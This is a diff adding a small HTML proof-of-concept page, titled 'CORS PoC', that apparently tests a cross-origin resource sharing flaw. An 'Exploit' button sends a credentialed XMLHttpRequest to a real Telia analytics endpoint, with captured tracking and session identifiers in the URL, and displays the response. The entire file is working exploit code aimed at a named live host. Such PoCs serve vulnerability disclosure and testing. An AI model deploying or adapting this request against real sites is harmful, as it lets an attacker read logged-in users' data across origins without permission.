@@ -1,0 +1,22 @@
+<html>
+     <body>
+         <h2>CORS PoC</h2>
+         <div id="demo">
+             <button type="button" onclick="cors()">Exploit</button>
+         </div>
+         <script>
+             function cors() {
+             var xhr = new XMLHttpRequest();
+             xhr.onreadystatechange = function() {
+                 if (this.readyState == 4 && this.status == 200) {
+                 document.getElementById("demo").innerHTML = alert(this.responseText);
+                 }
+             };
+              xhr.open("GET",
+                       "https://cat.telia.ee/g/collect?v=2&tid=G-N04G9MX30F&gtm=45he4340v879266244za200&_p=1709727583043&gcs=G111&gcd=13n3n3n3n5&npa=0&dma_cps=sypham&dma=1&gdid=dMWZhNz&cid=273606926.1709418323&ul=en-us&sr=1366x768&ur=&pscdl=noapi&sst.uc=&sst.rnd=1810349417.1709727584&sst.gcd=13n3n3n3n5&sst.us_privacy=1---&sst.tft=1709727583043&_s=5&sid=1709727583&sct=1&seg=1&dl=https%3A%2F%2Fwww.telia.ee%2Fen%2Fera&dt=Mobile%2C%20Internet%2C%20TV%20and%20IT%20solutions%20-%20Telia&en=user_engagement&ep.ab_test_variation=&_et=12575&tfd=62650", true);
+             xhr.withCredentials = true;
+             xhr.send();
+             }
+         </script>
+     </body>
+ </html>
